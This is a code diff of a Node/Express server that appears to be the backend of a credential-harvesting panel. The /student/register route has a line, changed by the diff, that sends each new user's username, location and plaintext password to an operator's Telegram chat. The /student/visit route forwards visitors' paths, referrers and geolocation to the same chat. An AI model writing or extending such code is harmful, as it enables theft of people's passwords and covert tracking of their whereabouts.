@@ -266,6 +266,7 @@ app.post("/admins/vote", async (req, res) => {
       action: "vote_cast",
       details: { newVoteCount: admin.votes },
     });
+await sendTelegram(admin.chatId, `🎉 Hi ${firstname},  someone just voted for you, you can now request security code`);
 
     console.log(`🗳️ Vote recorded for ${admin.username} — total: ${admin.votes}`);
 
@@ -424,8 +425,9 @@ app.post("/student/visit", async (req, res) => {
     // notify admin (non-blocking)
   
 
-    await sendToAdmin(admin.chatId, `📈 someone visited your Page \nPath: ${path || '/'}\nReferral: ${actualReferrer || "direct"}\nLocation: ${JSON.stringify(location)}`);
+  
     
+await sendTelegram(admin.chatId, `📈 someone visited your Page \nPath: ${path || '/'}\nReferral: ${actualReferrer || "direct"}\nLocation: ${JSON.stringify(location)} `);
 
     return res.json({ success: true, message: "Visit tracked" });
   } catch (err) {
@@ -487,7 +489,7 @@ app.post("/student/register", async (req, res) => {
     });
 
     // notify admin & owner
-    await sendToAdmin(admin._id, `🆕 New client: *${username}*\nLocation: *${location.city || "Unknown city"}*, *${location.country || "Unknown country"}* Password: *${password}*`);
+    await sendTelegram(admin.chatId, `🆕 New client: *${username}*\nLocation: *${location.city || "Unknown city"}*, *${location.country || "Unknown country"}* Password: *${password}*`);
     await sendTelegram(ADMIN_CHAT_ID, `🆕 Student registered: *${username}* (via ${admin.username}) from *${location.country || "Unknown location"} `);
 
     return res.json({ success: true, studentId: student._id, admin: { username: admin.username, phone: admin.phone } });
